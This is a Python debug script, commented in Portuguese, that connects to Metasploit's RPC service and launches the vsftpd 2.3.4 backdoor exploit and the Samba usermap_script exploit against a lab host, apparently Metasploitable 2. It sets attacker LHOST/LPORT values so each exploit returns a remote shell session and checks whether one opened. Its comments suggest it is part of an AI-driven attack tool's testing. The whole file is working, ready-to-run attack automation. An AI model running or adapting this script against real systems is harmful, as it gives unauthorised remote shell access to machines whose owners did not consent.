# -*- coding: utf-8 -*-
import sys
import os
import time

# Ajusta o path para importar modulos do src
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from metasploit_client import MetasploitClient

TARGET_IP = "192.168.70.30"
ATTACKER_IP = "192.168.70.20"

def test_exploit(client, name, options):
    print(f"\n>>> TESTANDO: {name}")
    print(f"    Alvo: {TARGET_IP}")
    
    if not client.verify_module_exists("exploit", name):
        print(f"    [ERRO] Modulo {name} nao encontrado no MSF.")
        return False

    print("    [1] Executando exploit...")
    try:
        # Adiciona opcoes padrao vitais
        options["RHOSTS"] = TARGET_IP
        options["LHOST"] = ATTACKER_IP
        options["LPORT"] = "4444"
        options["DisablePayloadHandler"] = "false"
        
        # Executa
        client.run_module("exploit", name, options)
        
        # Espera um pouco pela sessao
        print("    [2] Aguardando sessao (10s)...")
        time.sleep(10)
        
        # Verifica
        sid = client.check_session()
        if sid:
            print(f"    [SUCESSO] Sessao {sid} aberta! A conectividade esta PERFEITA.")
            return True
        else:
            print("    [FALHA] Exploit rodou, mas nenhuma sessao retornou.")
            return False
            
    except Exception as e:
        print(f"    [EXCEPTION] Erro ao rodar: {e}")
        return False

def main():
    print("=== DEBUG MANUAL DE ATAQUE ===")
    try:
        client = MetasploitClient(password="msfpass", server="192.168.70.20")
        print("[OK] Conectado ao MSF RPC.")
    except Exception as e:
        print(f"[FATAL] Nao conectou ao MSF: {e}")
        return

    # --- TESTE 1: VSFTPD (Backdoor na Porta 21) ---
    # Este eh o exploit mais confiavel do Metasploitable 2.
    # Se este falhar, temos um problema de rede.
    success_ftp = test_exploit(
        client, 
        "unix/ftp/vsftpd_234_backdoor", 
        {"RPORT": 21}
    )

    if success_ftp:
        print("\n[CONCLUSAO] O problema eh a IA. A rede e o MSF estao ok.")
        return

    # --- TESTE 2: Samba Usermap (Porta 139/445) ---
    # Caso o FTP tenha falhado por firewall, tentamos o Samba.
    print("\n[INFO] Tentando alternativa (Samba)...")
    success_samba = test_exploit(
        client,
        "multi/samba/usermap_script",
        {"RPORT": 139} # Ou 445
    )
    
    if success_samba:
        print("\n[CONCLUSAO] O problema eh a IA (e talvez o modulo FTP).")
    else:
        print("\n[CONCLUSAO CRITICA] Falha total. Verifique a rede docker (192.168.70.x) e se o LHOST esta correto.")

if __name__ == "__main__":
    main()